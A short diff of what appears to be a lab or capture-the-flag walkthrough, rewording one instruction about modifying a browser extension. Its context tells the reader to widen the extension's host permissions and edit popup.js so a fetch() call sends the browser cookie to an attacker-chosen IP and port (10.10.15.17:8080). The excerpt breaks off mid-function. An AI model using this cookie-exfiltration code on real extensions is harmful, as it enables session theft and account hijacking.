@@ -26,7 +26,7 @@ Open manifest.json with nano and change the host permissions to allow the extent
 }
 
 ```
-and also change popup.js to send the cookie to your ip and port of your choosing:    
+Also change popup.js to send the cookie to your ip and port of your choosing:    
 ```
 function sendCookieToProxy(cookie) {
   fetch('http://10.10.15.17:8080/cookie', { <--- Your ip and port
